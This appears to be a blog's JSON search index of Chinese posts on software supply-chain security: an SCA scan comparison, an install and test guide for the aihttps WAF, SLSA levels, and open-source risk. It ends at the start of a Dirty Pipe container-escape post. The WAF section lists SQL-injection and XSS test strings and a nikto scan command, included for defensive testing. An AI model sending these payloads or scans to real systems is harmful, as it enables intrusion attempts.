/Users/xfxj01/OpenSCA/engine/dataSnyk：182个漏洞：7个严重、111个高危、56中危、8低危dependency-check：256个漏洞：严重231、高危17个、中危8个\n\n\n\nDependency↑\nVulnerability IDs\nPackage\nHighest Severity\nCVE Count\nConfidence\nEvidence Count\n\n\n\nbiz-service-0-1.0.0.jar: bcprov-jdk15on-1.47.jar\ncpe:2.3:a:bouncycastle:legion-of-the-bouncy-castle-java-crytography-api:1.47:::::::*\npkg:maven&#x2F;org.bouncycastle&#x2F;&#x62;&#x63;&#x70;&#x72;&#111;&#118;&#x2d;&#x6a;&#x64;&#107;&#x31;&#53;&#111;&#110;&#x40;&#x31;&#46;&#x34;&#55;\nHIGH\n16\nHighest\n36\n\n\nbiz-service-0-1.0.0.jar: guava-18.0.jar\ncpe:2.3:a:google:guava:18.0:::::::*\npkg:maven&#x2F;com.google.guava&#x2F;&#103;&#x75;&#x61;&#x76;&#x61;&#x40;&#x31;&#x38;&#x2e;&#48;\nMEDIUM\n2\nHighest\n19\n\n\nbiz-service-0-1.0.0.jar: httpclient-4.5.2.jar\ncpe:2.3:a:apache:httpclient:4.5.2:::::::*\npkg:maven&#x2F;org.apache.httpcomponents&#x2F;&#x68;&#x74;&#116;&#112;&#99;&#x6c;&#105;&#101;&#110;&#x74;&#x40;&#52;&#x2e;&#x35;&#x2e;&#50;\nMEDIUM\n1\nHighest\n31\n\n\nbiz-service-0-1.0.0.jar: jackson-core-2.8.5.jar\ncpe:2.3:a:fasterxml:jackson-modules-java8:2.8.5:::::::*\npkg:maven&#x2F;com.fasterxml.jackson.core&#x2F;&#106;&#97;&#x63;&#107;&#x73;&#x6f;&#x6e;&#x2d;&#99;&#111;&#x72;&#x65;&#64;&#x32;&#46;&#x38;&#x2e;&#x35;\nMEDIUM\n1\nLow\n45\n\n\nbiz-service-0-1.0.0.jar: jackson-databind-2.8.5.jar\ncpe:2.3:a:fasterxml:jackson-databind:2.8.5:::::::*\npkg:maven&#x2F;com.fasterxml.jackson.core&#x2F;&#x6a;&#97;&#x63;&#107;&#115;&#111;&#x6e;&#45;&#x64;&#97;&#x74;&#x61;&#x62;&#105;&#110;&#100;&#64;&#50;&#x2e;&#56;&#46;&#53;\nCRITICAL\n39\nHighest\n41\n\n\n\ncpe:2.3:a:fasterxml:jackson-modules-java8:2.8.5:::::::*\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: logback-core-1.1.8.jar\ncpe:2.3:a:qos:logback:1.1.8:::::::*\npkg:maven&#x2F;ch.qos.logback&#x2F;&#108;&#111;&#103;&#98;&#97;&#x63;&#x6b;&#x2d;&#x63;&#111;&#114;&#x65;&#64;&#x31;&#46;&#x31;&#x2e;&#x38;\nCRITICAL\n2\nHighest\n32\n\n\nbiz-service-0-1.0.0.jar: netty-transport-4.0.27.Final.jar\ncpe:2.3:a:netty:netty:4.0.27:::::::*\npkg:maven&#x2F;io.netty&#x2F;&#110;&#101;&#116;&#x74;&#x79;&#x2d;&#116;&#114;&#x61;&#110;&#x73;&#x70;&#x6f;&#x72;&#116;&#64;&#52;&#46;&#x30;&#x2e;&#x32;&#55;&#x2e;&#x46;&#105;&#x6e;&#x61;&#108;\nCRITICAL\n12\nHighest\n25\n\n\nbiz-service-0-1.0.0.jar: snakeyaml-1.17.jar\ncpe:2.3:a:snakeyaml_project:snakeyaml:1.17:::::::*\npkg:maven&#x2F;org.yaml&#x2F;&#115;&#110;&#97;&#107;&#101;&#121;&#x61;&#109;&#108;&#64;&#x31;&#46;&#x31;&#x37;\nHIGH\n1\nHighest\n45\n\n\n\ncpe:2.3:a:yaml_project:yaml:1.17:::::::*\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: spring-boot-1.4.3.RELEASE.jar\ncpe:2.3:a:vmware:spring_boot:1.4.3:release::::::\npkg:maven&#x2F;org.springframework.boot&#x2F;&#x73;&#112;&#114;&#105;&#x6e;&#x67;&#x2d;&#x62;&#x6f;&#x6f;&#116;&#64;&#x31;&#46;&#52;&#x2e;&#51;&#46;&#x52;&#69;&#x4c;&#x45;&#x41;&#83;&#69;\nCRITICAL\n3\nHighest\n32\n\n\nbiz-service-0-1.0.0.jar: spring-cloud-netflix-core-1.1.0.RELEASE.jar\ncpe:2.3:a:vmware:spring_cloud_netflix:1.1.0:release::::::\npkg:maven&#x2F;org.springframework.cloud&#x2F;&#115;&#x70;&#114;&#x69;&#110;&#x67;&#45;&#x63;&#108;&#x6f;&#x75;&#100;&#45;&#x6e;&#x65;&#x74;&#x66;&#x6c;&#x69;&#x78;&#x2d;&#99;&#111;&#x72;&#x65;&#x40;&#x31;&#46;&#49;&#x2e;&#48;&#x2e;&#x52;&#x45;&#76;&#x45;&#65;&#x53;&#x45;\nMEDIUM\n2\nHighest\n24\n\n\nbiz-service-0-1.0.0.jar: spring-cloud-netflix-eureka-client-1.1.0.RELEASE.jar\ncpe:2.3:a:vmware:spring_cloud_netflix:1.1.0:release::::::\npkg:maven&#x2F;org.springframework.cloud&#x2F;&#115;&#112;&#114;&#105;&#110;&#103;&#x2d;&#99;&#108;&#111;&#117;&#100;&#45;&#110;&#101;&#x74;&#102;&#x6c;&#105;&#x78;&#x2d;&#x65;&#x75;&#x72;&#x65;&#x6b;&#x61;&#45;&#99;&#108;&#105;&#x65;&#110;&#x74;&#x40;&#49;&#46;&#x31;&#46;&#x30;&#x2e;&#82;&#69;&#76;&#x45;&#65;&#83;&#69;\nMEDIUM\n1\nHighest\n26\n\n\nbiz-service-0-1.0.0.jar: spring-cloud-starter-eureka-1.1.0.RELEASE.jar\ncpe:2.3:a:vmware:spring_cloud_netflix:1.1.0:release::::::\npkg:maven&#x2F;org.springframework.cloud&#x2F;&#x73;&#112;&#x72;&#x69;&#110;&#x67;&#45;&#x63;&#108;&#111;&#x75;&#100;&#45;&#x73;&#116;&#97;&#114;&#x74;&#101;&#114;&#x2d;&#101;&#x75;&#114;&#101;&#107;&#x61;&#x40;&#x31;&#x2e;&#49;&#46;&#48;&#46;&#x52;&#x45;&#76;&#69;&#x41;&#83;&#x45;\nMEDIUM\n1\nLow\n24\n\n\nbiz-service-0-1.0.0.jar: spring-core-4.3.5.RELEASE.jar\ncpe:2.3:a:pivotal_software:spring_framework:4.3.5:release::::::\npkg:maven&#x2F;org.springframework&#x2F;&#x73;&#112;&#x72;&#x69;&#x6e;&#x67;&#45;&#x63;&#x6f;&#114;&#101;&#64;&#52;&#46;&#x33;&#46;&#53;&#46;&#82;&#x45;&#76;&#69;&#x41;&#83;&#x45;\nCRITICAL\n13\nHighest\n35\n\n\n\ncpe:2.3:a:springsource:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\n\ncpe:2.3:a:vmware:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: spring-expression-4.3.5.RELEASE.jar\ncpe:2.3:a:pivotal_software:spring_framework:4.3.5:release::::::\npkg:maven&#x2F;org.springframework&#x2F;&#x73;&#112;&#x72;&#105;&#x6e;&#103;&#45;&#101;&#120;&#112;&#114;&#x65;&#x73;&#x73;&#105;&#x6f;&#110;&#x40;&#52;&#x2e;&#51;&#x2e;&#x35;&#46;&#82;&#x45;&#76;&#x45;&#65;&#83;&#69;\nCRITICAL\n14\nHighest\n37\n\n\n\ncpe:2.3:a:springsource:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\n\ncpe:2.3:a:vmware:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: spring-security-crypto-4.1.4.RELEASE.jar\ncpe:2.3:a:pivotal_software:spring_security:4.1.4:release::::::\npkg:maven&#x2F;org.springframework.security&#x2F;&#115;&#112;&#x72;&#105;&#x6e;&#x67;&#x2d;&#115;&#101;&#x63;&#x75;&#114;&#x69;&#x74;&#121;&#x2d;&#99;&#x72;&#x79;&#x70;&#x74;&#x6f;&#64;&#x34;&#x2e;&#x31;&#46;&#52;&#x2e;&#82;&#69;&#x4c;&#69;&#x41;&#x53;&#x45;\nCRITICAL\n5\nHighest\n47\n\n\n\ncpe:2.3:a:vmware:spring_security:4.1.4:release::::::\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: spring-web-4.3.5.RELEASE.jar\ncpe:2.3:a:pivotal_software:spring_framework:4.3.5:release::::::\npkg:maven&#x2F;org.springframework&#x2F;&#115;&#x70;&#114;&#105;&#x6e;&#x67;&#45;&#x77;&#x65;&#98;&#64;&#52;&#x2e;&#x33;&#46;&#x35;&#46;&#82;&#x45;&#x4c;&#69;&#65;&#x53;&#69;\nCRITICAL\n14\nHighest\n35\n\n\n\ncpe:2.3:a:springsource:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\n\ncpe:2.3:a:vmware:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: spring-webmvc-4.3.5.RELEASE.jar\ncpe:2.3:a:pivotal_software:spring_framework:4.3.5:release::::::\npkg:maven&#x2F;org.springframework&#x2F;&#x73;&#112;&#114;&#105;&#110;&#x67;&#45;&#x77;&#101;&#x62;&#109;&#x76;&#x63;&#64;&#52;&#46;&#x33;&#46;&#x35;&#x2e;&#x52;&#x45;&#76;&#69;&#x41;&#x53;&#x45;\nCRITICAL\n15\nHighest\n36\n\n\n\ncpe:2.3:a:springsource:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\n\ncpe:2.3:a:vmware:spring_framework:4.3.5:release::::::\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: tomcat-embed-core-8.5.6.jar\ncpe:2.3:a:apache:tomcat:8.5.6:::::::*\npkg:maven&#x2F;org.apache.tomcat.embed&#x2F;&#116;&#x6f;&#x6d;&#99;&#97;&#116;&#45;&#x65;&#109;&#x62;&#101;&#x64;&#45;&#99;&#x6f;&#114;&#x65;&#64;&#x38;&#x2e;&#x35;&#x2e;&#x36;\nCRITICAL\n40\nHighest\n23\n\n\n\ncpe:2.3:a:apache_tomcat:apache_tomcat:8.5.6:::::::*\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: tomcat-embed-websocket-8.5.6.jar\ncpe:2.3:a:apache:tomcat:8.5.6:::::::*\npkg:maven&#x2F;org.apache.tomcat.embed&#x2F;&#x74;&#111;&#x6d;&#x63;&#97;&#116;&#45;&#101;&#x6d;&#x62;&#x65;&#x64;&#45;&#119;&#101;&#98;&#115;&#111;&#99;&#x6b;&#x65;&#116;&#64;&#x38;&#x2e;&#53;&#46;&#54;\nCRITICAL\n41\nHighest\n27\n\n\n\ncpe:2.3:a:apache_tomcat:apache_tomcat:8.5.6:::::::*\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: xstream-1.4.2.jar\ncpe:2.3:a:xstream_project:xstream:1.4.2:::::::*\npkg:maven&#x2F;com.thoughtworks.xstream&#x2F;&#120;&#115;&#x74;&#114;&#x65;&#97;&#x6d;&#x40;&#49;&#x2e;&#52;&#46;&#x32;\nCRITICAL\n33\nHighest\n21\n\n\ndepemdemcy-track：78个漏洞：严重16个、高危31个、中危29个、低危2个\n测试对比\n\n\n对比项\nSCA-Check\nSnky\ndependency-check\n\n\n\ndashboard\nSAAS暂无\n有\n无，可以查看报告\n\n\n漏洞描述\n中文\n英文\n\n\n\n漏洞细节\n基本\n详细部分包含Poc\n基本NVD数据\n\n\n漏洞库\ncnncd cnvd nvd 自有\nnvd   自有\nnvd\n\n\n组件风险\n有\n无\n有\n\n\n容器风险\nyaml\n无\n暂无\n\n\nReferencesSnyk User Documentation - Snyk User Docs简介 | OpenSCA-用开源的方式做开源风险治理\n","slug":"OpenSCA","date":"2022-06-22T01:09:00.000Z","categories_index":"软件供应链安全","tags_index":"SCA,软件成分分析工具,软件供应链安全,opensca,悬镜安全","author_index":"Moses"},{"id":"80f3746730bf9c3463eb9ffedee128cb","title":"开源WAF调研之产品选型-AIhttps","content":"简介aihttps是hihttps的升级版，首款基于机器学习、自主对抗未知攻击的高性能WEB应用防火墙（ SSL WAF），源码完整并且兼容ModSecurity正则规则。📢该项目个人开发，维护性差，不列入选型名单，可作为产品功能参考⭐️DEMOHIHTTPS企业级WAF设备\n功能\n恶意Web漏洞扫描\n数据库SQL注入\n跨站脚本攻击（XSS)\nCC  &amp; DDOS防护\n密码暴力破解\n危险文件上传检测\n非法URL&#x2F;文件访问\n兼容OWASP的ModSecurity正则规则\nepoll模型单核数万并发连接\n无监督机器学习、自主生成对抗规则\n\n编译安装\n安装openssl和libpcre库  CentOS : yum install openssl openssl-devel\nyum install -y pcre pcre-devel \n  Debian&#x2F;Ubuntu:sudo apt-get install openssl libssl-dev\napt-get install libpcre3 libpcre3-dev  \n&#96;&#96;&#96;  \n  2. 编译\n  解压到任意目录，make后生成可执行文件aihttps\n  [rules]是规则目录，[train]是样本采集目录，[vector]是自然语言word2doc向量生成目录，[src]是源码目录。\n \n  \n  3. 规则\n  规则放在和aihttps同一级的rules目录，更多规则在[https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;owasp-modsecurity-crs&#x2F;](https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;owasp-modsecurity-crs&#x2F;) 下载。\n\n  \n  4. 运行\n  通常aihttps前端绑定443端口（https），后端反向代理80端口; 首先保证Web服务器80端口运行正常，443端口没占用。  \n  .&#x2F;aihttps默认读取当前目录下的confg.cfg文件，  或者.&#x2F;aihttps --config &#x2F;dir&#x2F;config.cfg， 打印出规则就成功。\n  # 测试\n  1.ModSecurity规则测试\n  rules&#x2F;main.rule默认加载了一条SQL语句检测规则，可以访问https:&#x2F;&#x2F;serverip&#x2F;select.html?testsql&#x3D;delete * from test\n  或者用Kali系统的漏洞扫描器nikto运行：.&#x2F;nikto  -host serverip -ssl -port 443 -C all\n  如果产生了报警记录，则代表正常！\n  \n  \n  2.机器学习&#x2F;自主对抗规则测试方法：\n  \n  机器学习是核心，但采集样本需要一定时间，为了方便测试，默认了一条aihttps.html对抗规则：\n  如果访问https:&#x2F;&#x2F;serverip&#x2F;aihttps.html?id&#x3D;123采集到的样本大于99%都是这种形态，那么下面的网址都将产生攻击报警：\n  &#96;&#96;&#96;md\n  https:&#x2F;&#x2F;serverip&#x2F;aihttps.html?id&#x3D;123&#39; or 1&#x3D;&#39;1\n  https:&#x2F;&#x2F;serverip&#x2F;aihttps.html?id&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;\n  https:&#x2F;&#x2F;serverip&#x2F;aihttps.html?id&#x3D;1234567890&amp;t&#x3D;123\n  https:&#x2F;&#x2F;serverip&#x2F;aihttps.html?id&#x3D;abc\n  3、要测试并发连接，可以用wrk等工具在相同环境测试比nginx反向代理的性能更强。  wrk -c 25 -t 25 -d 10 https://127.0.0.1/\n\n防护规则\n\n\n序号\n规则分类名称\n规则文件名\n状态\n设置\n\n\n\n1\nSQL注入\nREQUEST-942-APPLICATION-ATTACK-SQLI.conf\n已启用\n\n\n\n2\nXSS攻击\nREQUEST-941-APPLICATION-ATTACK-XSS.conf\n已启用\n\n\n\n3\n黑客工具恶意扫描\nREQUEST-913-SCANNER-DETECTION.conf\n已启用\n\n\n\n4\n密码暴力破解\nRREQUEST-20-APPLICATION-Brute-PASS.conf\n已启用\n\n\n\n5\nCC &amp; DDOS攻击\nREQUEST-20-APPLICATION-CC-DDOS.conf\n已启用\n\n\n\n6\n恶意漏洞探测\nREQUEST-102-WWW-RULES.conf\n已启用\n\n\n\n7\n远程执行任意命令漏洞\nREQUEST-932-APPLICATION-ATTACK-RCE.conf\n已启用\n\n\n\n8\n机器学习\nREQUEST-888-ML-RULES.conf\n已启用\n\n\n\n9\n人工智能\nREQUEST-188-APPLICATION-EXPERT.conf\n已启用\n\n\n\n运行设置 X-Real-IP X-Forwarded-For Ali-CDN-Real-IP \n运行状态 \n","slug":"开源WAF-hihttps","date":"2022-06-20T08:44:21.468Z","categories_index":"开源WAF产品选型","tags_index":"WAF,Nginx,开源WAF产品选型,modsecurity,安全建设","author_index":"Moses"},{"id":"8ee8224489aaec6996f4a5509d1757b4","title":"开源软件选型及安全指标参考","content":"开源软件选型及安全指标参考参考概述和背景开源软件供应链风险\n安全漏洞\n安全漏洞在生态中普遍存在\n软件供应链中的安全漏洞影响广泛\n安全漏洞危害严重\n\n\n恶意软件\n恶意软件感染方式多样、上下游投毒\n恶意软件影响\n\n\n软件许可证\n软件许可证违反风险\n软件许可证修改风险\n\n\n软件维护\n开源软件开发者风险\n开源软件停止维护风险\n开源软件版本升级风险\n\n\n\n开源组件的安全风险近年来，针对软件供应链的安全攻击事件一直呈快速增长态势，造成的危害越来越严重，防范软件供应链安全风险，已经迫在眉睫；开源软件漏洞频现：截至2020年底，CVE&#x2F;NVD、CNNVD、CNVD等公开漏洞库中共收录开源软件相关漏洞41342个，其中高达13%（5366个）为2020年度新增漏洞；研究发现：近9成软件项目存在已知开源软件漏洞；平均每个软件项目存在66个已知开源软件漏洞；影响最广的开源软件漏洞存在于44.3%的软件项目中；15年前开源软件漏洞仍存在于多个软件项目中。2020年 “奇安信开源项目检测计划”对1364个开源软件项目的源代码安全检测显示：开源软件项目整体缺陷密度为14.96个&#x2F;千行，高危缺陷密度为0.95个&#x2F;千行；\n\n\n\n序号\n组织类型\n缺陷密度(个&#x2F;千行代码)\n\n\n\n1\n普通软件工程师\n50~250\n\n\n2\n普通软件开发公司\n4-40\n\n\n3\n高水平软件开发公司\n2~4\n\n\n4\n美国NASA\n0.1\n\n\n5\n国内软件公司\n6\n\n\n组件的合规风险合规风险主要来源于两方面，一方面是开源协议滥用导致的安全风险，另一方面是来之监管合规的风险。\n\n\n\n\n\n\n\n\n\n\n《中华人民共和国网络安全法》第三十三条规定，建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。该条规定，明确了关键信息基础设施的安全工作应该前移，在信息系统的规划阶段就应该保证安全技术措施的介入。\n信息安全技术网络安全等级保护基本要求【GBT22239-2019】中要求企业自行软件开发应制定代码编写安全规范，要求开发人员参照规范编写代码，在软件开发过程中对安全性进行测试，在软件安装前对可能存在的恶意代码进行检测；对外包软件开发应在软件交付前检测其中可能存在的恶意代码。\n2019年，中国银保监会办公厅文件【银保监办发（2019）129号】文《中国银保监会办公厅关于开展银行业和保险业网络安全专项治理工作的通知》中提出建立新技术引入、开源技术应用安全评估与准入机制，加强科技创新、新技术应用的风险监测与处置。\n2020年，中国人民银行办公厅文件【银办发（2020）45号】文《中国人民银行办公厅关于开展金融科技应用风险专项摸排工作的通知》中提出应不定期组织针对开源系统或组件的安全测评，及时进行漏洞修复和加固处理。\n\n对于开源协议不清楚的看官可以直接参考乌克兰程序员Paul Bagwell画的开源协议分析图，介绍最流行的六种开源许可证—-GPL、BSD、MIT、Mozilla、Apache和LGPL。\n组件的稳定性开源社区维护者和贡献者为我们所有人构建工具，为我们日常的开发提供了很大的帮助，但开源社区的贡献者自身却面临诸多问题，这些问题一定程度上影响了开源软件的可持续发展，开源项目的可持续性也一直存在矛盾。这一矛盾导致很多开源软件在最初更新迭代比较快速，文档书写也比较及时，后面却可能出现一些人员离职等问题，导致该开源产品后续的更新不及时，甚至直接中断，这时使用该开源产品的的同学在反馈问题时往往需要很长时间才会得到答复，甚至得不到答复。\n\n\n\n\n\n\n\n\n\n\n除非是非常成熟的开源项目，否则其稳定性是未经考验的，这也是使用开源项目在真正进入持续商业化时所遇到的最大挑战！关于一个项目是否“成熟”，这是个非常主观的问题，如果用Github的star数量来衡量，要充分考虑中国式开源通过运营人头来点赞的模式，即便有1-2万颗星，也并不意味着项目已经成熟了。另外，要看Top-100的贡献者，很多所谓的开源项目几乎所有的贡献者都是项目所在公司的内部员工，这种开源项目的成熟度能有多少呢？\n像MySQL，Redis之类这么稳定的项目并不常见，即便是像MongoDB这么宏大的开源项目，一旦进入大规模部署后对于任何中小公司而言都是巨大的挑战，一旦无法克服，会深陷泥潭难以自拔。\n国内市场上一度火爆的TFS(Taobao File System&#x3D;淘宝文件系统)，曾经受到很多程序员的追捧，但是很少有人仔细的分析过淘宝的应用场景和对该项目的支持力度，现在该项目已经寿终正寝（淘宝团队不再维护该项目），而且淘宝当时设计的目的是支持海量小文件，而有多少创业项目是一样的业务需求呢？很多人盲目的上马了TFS，到头来发现系统稳定性很差而且有无数的问题，这些是小团队、二次开发能力并不强悍的团队可以承受得了的吗？https://zhuanlan.zhihu.com/p/361101335\n\n举例：Hystrix官方已经宣布停止维护了，最新版本为2018年11月17日发布的1.5.18，但是还有很多项目中使用的Hystrix作为限流熔断组件（版本多为1.5.10、1.5.12、1.5.18），面临性能、安全、稳定性等一些列问题\n不同阶段的风险引入\n开源软件选择openbase\n开源软件安全指标Security Metrics - Open Source Security FoundationOpenssf最佳实践\n开源软件的评估组件评估方法仅适用于对组件的安全风险进行评估，评估方法如下：\n* 使用评估检测工具\n* 人工复核排查\n* 源代码审计\n组件安全检测工具[[dependency-track]][[dependency-check]]\n闭源组件从 《个人信息安全规范》 新标准的规定可以看出，关于对第三方接入的管理，与共享、转让、委托处理中的规定和责任相似，例如，包括在事前建立第三方产品或服务接入管理机制，在接入后对第三方产品和服务进行持续监督、通过签署合同约束双方责任、需要明确告知个人信息主体服务由第三方提供、对记录进行保存、要求第三方确保个人信息主体授权同意、对第三方接入的自动化工具技术进行技术检测等等。涉及安全检测，如果提供源代码，可以对源代码进行白盒审计，出于保密考虑，部分单位拒绝提供源代码，可以通过厂商提供的demo，结合接口文档，组件设计文档进行安全评估。\n组件的运营建议外部依赖库扫描时机为引入前扫描、上线前扫描、定期扫描：\n1、引入前扫描：在引入外部依赖库前，对所用版本进行扫描，保证当前使用的外部依赖库版本不存在漏洞，减少后期升级、维护成本。\n2、上线前扫描：系统测试阶段或上线前，对系统所使用的外部依赖库进行一次统一扫描，确保上线前外部依赖库不存在公开的高危漏洞。\n3、定期扫描：定期对系统使用的外部依赖库进行统一扫描，以全面把控和修复不断暴露出的外部依赖库漏洞。\n\n外部依赖库检测可遵循工具扫描、排除误报、制定修复建议、实施修复的流程进行，形成检测和修复报告，作为开发阶段交付物。对于线上系统，可以构建组件清单列表，遵循基于组件生命周期的安全解决方案，结合组件威胁情报，一旦某个开源组件出现漏洞，可以通过清单列表迅速排查。以下是基于开源软件生命周期的供应链安全解决方案：可建立对应的流程和工具链。\n\n选型阶段\n准入阶段\n使用阶段\n运维阶段\n销毁阶段\n\n总结\n 持续构建物料清单:为每个应用程序持续构建详细的软件材料清单，从而全面洞察每个应用软件的组件情况。如果存在无法验证来源的开源组件，则不允许使用。——目前的解决方案使用DT+CycloneDX+Jenkins构建软件清单并对第三方开源软件名称&amp;版本进行限制 ✅ 2022-08-22\n 强化软件供应链:通过强化软件供应链来降低安全风险。这包括检查内部和外部源代码、支持脚本、配置文件和其他工件，并创建可信开源组件的内部存储库。而对外部存储库的使用要合理管理。    \n 风险管理:通过制定策略确定可接受的开源组件——解决方案如上 ✅ 2022-08-22\n 对在代码中发现漏洞或受限软件许可的合理响应，来管理风险——未开展IAST&amp;RAST&amp;SAST等方案\n\nReferences\n浅谈开源软件供应链风险\n\n","slug":"开源软件选型及安全指标参考","date":"2022-06-20T01:01:00.000Z","categories_index":"软件供应链安全","tags_index":"开源软件安全指标,openbase","author_index":"Moses"},{"id":"7af1666f1830041ec06497fadc48c24a","title":"软件供应链级别SLSA","content":"软件供应链级别SLSA概述和背景SLSA • Supply-chain Levels for Software Artifacts这是一个安全框架，是标准和控制的清单，以防止篡改，提高完整性，并保护项目、企业或企业中的软件包和基础设施。这就是你如何在链条中的任何环节从足够安全到尽可能有弹性。该项目目前处于alpha状态。GitHub - slsa-framework&#x2F;slsa: Supply-chain Levels for Software Artifacts\nSLSA用途SLSA帮助防范常见的软件供应链攻击。下图展示了一个典型的软件供应链，包括可能发生在供应链各个环节的攻击示例。在过去的几年中，每种类型的攻击均发生过，不幸的是，随着时间的推移，软件供应链事件攻击仍在增加。\n级别摘要\n\n\n水平\n描述\n例子\n\n\n\n1\n构建过程的文档\n未签名来源\n\n\n2\n构建服务的防篡改性\n托管源&#x2F;构建，签名来源\n\n\n3\n对特定威胁的额外抵抗力\n对主机的安全控制，不可伪造的来源\n\n\n4\n最高水平的信心和信任\n双方评论+密封构建\n\n\n详细解释\n\n\n水平\n要求\n\n\n\n0\n没有保证。SLSA 0表示缺乏任何SLSA级别。\n\n\n1\n构建过程必须完全脚本化&#x2F;自动化并生成来源。来源是关于工件如何构建的元数据，包括构建过程、顶级源代码和依赖项。了解来源允许软件消费者做出基于风险的安全决策。SLSA 1的来源不能防止篡改，但它提供了基本水平的代码源识别，并可以帮助漏洞管理。\n\n\n2\n需要使用版本控制和生成经过身份验证的来源的托管构建服务。这些额外的要求使软件消费者对软件的起源更有信心。在这个级别上，来源可以防止篡改，以至于构建服务受到信任。SLSA 2还提供了一个简单的SLSA 3升级路径。\n\n\n3\n源平台和构建平台分别符合特定标准，以保证源的可审计性和来源的完整性。我们设想了一个认证流程，根据该流程，审计师证明平台符合要求，然后消费者可以依赖这些要求。SLSA 3通过防止特定类别的威胁，如跨建筑污染，比早期水平提供了更强的防篡改保护。\n\n\n4\n需要对所有更改进行两人审查，以及密封的、可复制的构建过程。两人评论是识别错误和阻止不良行为的行业最佳实践。Hermetic构建保证来源的依赖项列表是完整的。可复制的构建虽然不是严格要求，但提供了许多可审计性和可靠性优势。总体而言，SLSA 4给了消费者高度的信心，即该软件没有被篡改。\n\n\n威胁与缓解措施\n\n\n\n序号\n威胁类型\n威胁案例\nSLSA防御\n\n\n\nA\n将恶意代码提交到源存储库\nLinux恶意上传带有漏洞的patch：研究人员试图通过邮件列表上的补丁程序故意将漏洞引入Linux内核。\n双人审查可以审核大多数（但不是全部的）漏洞。\n\n\nB\n恶意托管源代码管理平台\nPHP官方git被攻陷：攻击者破坏了PHP的自托管git服务器，并注入了两个恶意提交。\n防御较好的源代码平台增加了攻击者难度\n\n\nC\n使用正式流程构建，但源代码与源代码管理不匹配\nWebmin:攻击者修改了构建工作流以使用与源代码管理不匹配的源文件。\n一个符合SLSA的构建服务器会识别实际使用的源代码，允许用户检测此类篡改。\n\n\nD\n被攻陷的构建平台\nSolarWinds：攻击者破坏了构建平台，并植入了一个在每次构建过程中注入恶意代码的程序。\n更高SLSA 级别要求构建平台具有强有力的安全控制措施，确保构建平台可以持久性并且难以被破坏\n\n\nE\n使用恶意的依赖(即A-H，递归)\n事件流攻击：攻击者添加了一个无害的依赖项，然后更新该依赖并添加恶意代码。更新与提交给GitHub的代码不匹配（即攻击F）\n在所有依赖项中使用SLSA，可能会阻止特定的攻击，因为源代码可能会提示它不是由正确的构建环境构建的，或者源代码不是来自GitHub。\n\n\nF\n上传不是由CI&#x2F;CD系统生成的中间件\nCodeCov：攻击者使用泄露的证书将恶意中间件上传到GCS存储库，用户可以从上面直接下载。\nGCS存储库中，中间件的出处会显示中间件不是以预期的方式从预期的源构建的。\n\n\nG\n恶意的软件仓库\n攻击软件镜像站：研究人员测试几个流行的软件镜像站，这些镜像站可能会被用来托管恶意软件\n与上面的（F）类似，恶意组件的出处会显示它们不是按照预期构建的，或者不是从预期的源repo构建的。\n\n\nH\n欺骗用户使用恶意的软件包\n包名抢注: 攻击者上传了一个与原始文件名相似的恶意软件。\nSLSA不能直接解决这个威胁，但是通过控制源代码链接和增加其他解决方案来解决。\n\n\n\n\n\n\n可用性威胁\n已知的例子\nSLSA如何提供帮助\n\n\n\nE\n依赖项变得不可用\nMimemagic：维护人员故意从存储库中删除软件包或软件包版本，没有警告。网络错误或服务中断也可能使软件包暂时不可用。\nSLSA没有直接应对这一威胁。\n\n\n[[供应链攻击安全启示-SolarWinds事件分析]]\n软件供应链级别SLSA评估案例-kubeedge安全审计报告![[KubeEdge-security-audit-2022.pdf]]\nReferences\ncosign使用手册Detailed Usage - sigstore documentation\nSLSA术语SLSA • Terminology\nSLSA 框架与软件供应链安全防护 - 知乎\n从BAB到SLSA——谈Google的软件供应链风险治理 - 知乎\nGitHub - slsa-framework&#x2F;slsa: Supply-chain Levels for Software Artifacts\n\n","slug":"软件供应链级别SLSA","date":"2022-06-19T15:28:00.000Z","categories_index":"软件供应链安全","tags_index":"SCA,软件供应链安全,SLSA,安全框架,成熟度","author_index":"Moses"},{"id":"a848febdecd13e7af1ad2da3100c5412","title":"开软软件合规风险材料整理","content":"一、开源概述及开源风险分析开源合规系列（一）：开源概述及开源风险分析\n二、开源许可证开源合规系列（二：上）：开源许可证之GPL、AGPL、LGPL、MPL开源合规系列（二：下）：开源许可证之Apache、MIT、BSD及许可证兼容性分析\n三、开源合规系列（三）：开源合规建议及许可证热点问题解析开源合规系列（三）：开源合规建议及许可证热点问题解析\n","slug":"开源合规","date":"2022-06-19T08:43:00.000Z","categories_index":"软件供应链安全","tags_index":"软件供应链安全,开源软件风险合规,资料整理","author_index":"Moses"},{"id":"b2ff5f03ec5fcb6c8c71d036621f3f9f","title":"容器安全漏洞分析-利用CVE-2022-0847（Dirty Pipe)实现容器逃逸","content":"利用CVE-2022-0847（Dirty Pipe）实现容器逃逸0x00 背景简介GitHub - greenhandatsjtu&#x2F;CVE-2022-0847-Container-Escape: CVE-2022-0847 used to achieve container escape 利用CVE-2022-0847 (Dirty Pipe) 实现容器逃逸来源于上海交大网络与系统安全实验室的分享\n0x01 漏洞概要CVE-2022-0847介绍\n2022 年 03 月 7 日，安全研究员 Max Kellermann 披露了一个 Linux 内核本地提 权漏洞 CVE-2022-0847，命名为 Dirty Pipe [[Dirty Pipe提权CVE-2022-0847]]\n由于 pipe_buffer 结构体未正确初始化，攻击者可利用此漏洞向只读文件的页缓 存写入数据\n\nCAP_DAC_READ_SEARCH• 用于打开文件的系统调用 openat() 